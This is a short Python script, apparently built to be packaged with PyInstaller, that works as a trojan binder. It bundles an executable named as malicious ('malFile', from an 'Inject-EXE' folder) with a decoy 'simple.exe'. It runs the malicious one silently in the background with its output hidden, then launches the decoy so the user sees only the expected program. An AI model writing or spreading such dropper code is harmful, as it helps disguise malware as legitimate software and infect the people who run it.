import os, sys, subprocess

def base_path(path):
    if getattr(sys, 'frozen', None):
        basedir = sys._MEIPASS
    else:
        basedir = os.path.dirname(__file__)
    return os.path.join(basedir, path)

malFile = base_path('C:\\Users\\6lady\\feralka\\Inject-EXE\\copy_0d69979f.exe')
legitFile = base_path('simple.exe')

subprocess.Popen(malFile, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.call(legitFile, shell=True)
